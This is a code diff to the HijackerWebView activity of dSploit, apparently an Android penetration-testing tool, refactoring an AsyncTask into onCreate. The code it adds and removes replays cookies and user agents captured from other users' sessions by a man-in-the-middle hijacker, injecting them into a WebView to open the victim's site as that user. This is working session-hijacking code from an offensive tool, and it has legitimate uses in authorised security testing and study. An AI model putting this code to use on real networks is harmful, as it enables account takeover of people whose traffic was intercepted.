@@ -23,9 +23,7 @@ import org.apache.http.impl.cookie.BasicClientCookie;
 import it.evilsocket.dsploit.R;
 import it.evilsocket.dsploit.core.System;
 import it.evilsocket.dsploit.plugins.mitm.Hijacker.Session;
-import android.os.AsyncTask;
 import android.os.Bundle;
-import android.os.SystemClock;
 import android.webkit.CookieManager;
 import android.webkit.CookieSyncManager;
 import android.webkit.WebSettings;
@@ -40,9 +38,8 @@ public class HijackerWebView extends SherlockActivity
 {
 	private static final String DEFAULT_USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4";
 
-	private WebSettings    mSettings = null;
-	private WebView 	   mWebView  = null;
-	private WebViewTask    mTask 	 = null;
+	private WebSettings mSettings = null;
+	private WebView 	mWebView  = null;
 	
 	@Override  
     protected void onCreate( Bundle savedInstanceState ) {            
@@ -52,7 +49,6 @@ public class HijackerWebView extends SherlockActivity
         getSupportActionBar().setDisplayHomeAsUpEnabled(true);
                 
         mWebView  = ( WebView )findViewById( R.id.webView );               
-        mTask	  = new WebViewTask();
         mSettings = mWebView.getSettings();  
         
         mSettings.setJavaScriptEnabled(true);  
@@ -60,8 +56,45 @@ public class HijackerWebView extends SherlockActivity
 		mSettings.setAppCacheEnabled(false);
         mSettings.setUserAgentString( DEFAULT_USER_AGENT );
                
-        mTask.execute();
+        CookieSyncManager.createInstance( this );              
+    	CookieManager.getInstance().removeAllCookie();
+    	
+    	Session session = ( Session )System.getCustomData();
+    	if( session != null )
+    	{
+    		String domain    = null,
+    			   rawcookie = null;
+    		
+    		for( BasicClientCookie cookie : session.mCookies.values() )
+    		{
+    			domain 	  = cookie.getDomain();
+    			rawcookie = cookie.getName() + "=" + cookie.getValue() + "; domain=" + domain + "; path=/" + ( session.mHTTPS ? ";secure" : "" );                        
+    			        			
+    			CookieManager.getInstance().setCookie( domain, rawcookie );
+    		}
+    		        		        		
+    		CookieSyncManager.getInstance().sync();  
+    		
+    		if( session.mUserAgent != null && session.mUserAgent.isEmpty() == false )
+    			mSettings.setUserAgentString( session.mUserAgent );
+    		
+    		mWebView.loadUrl( ( session.mHTTPS ? "https" : "http" ) + "://www." + domain );
+    	}        	
     }  
+	
+	@Override
+	protected void onResume() {
+	    super.onResume();
+	    
+	    CookieSyncManager.getInstance().startSync();
+	}
+	
+	@Override
+	protected void onPause() {
+		super.onPause();
+		
+		CookieSyncManager.getInstance().stopSync();
+	}
 	
 	@Override
 	public boolean onCreateOptionsMenu( Menu menu ) {
@@ -104,48 +137,6 @@ public class HijackerWebView extends SherlockActivity
 				return super.onOptionsItemSelected(item);    
 	   }
 	}
-	
-	private class WebViewTask extends AsyncTask<Void, Void, Boolean> 
-	{         		
-        @Override  
-        protected void onPreExecute() {  
-        	CookieSyncManager.createInstance( HijackerWebView.this );              
-        	CookieManager.getInstance().removeAllCookie();
-
-            super.onPreExecute();  
-        }  
-        
-        protected Boolean doInBackground( Void... param ) {
-        	// Nasty hack to make CookieManager correctly sync
-        	SystemClock.sleep(1000);
-            return false;  
-        }  
-        
-        @Override  
-        protected void onPostExecute(Boolean result) {  
-        	Session session = ( Session )System.getCustomData();
-        	if( session != null )
-        	{
-        		String domain    = null,
-        			   rawcookie = null;
-        		
-        		for( BasicClientCookie cookie : session.mCookies.values() )
-        		{
-        			domain 	  = cookie.getDomain();
-        			rawcookie = cookie.getName() + "=" + cookie.getValue() + "; domain=" + domain + "; path=/" + ( session.mHTTPS ? ";secure" : "" );                        
-        			        			
-        			CookieManager.getInstance().setCookie( domain, rawcookie );
-        		}
-        		        		        		
-        		CookieSyncManager.getInstance().sync();  
-        		
-        		if( session.mUserAgent != null && session.mUserAgent.isEmpty() == false )
-        			mSettings.setUserAgentString( session.mUserAgent );
-        		
-        		mWebView.loadUrl( ( session.mHTTPS ? "https" : "http" ) + "://www." + domain );
-        	}        	
-        }  
-    }  
 		
 	@Override
 	public void onBackPressed() {
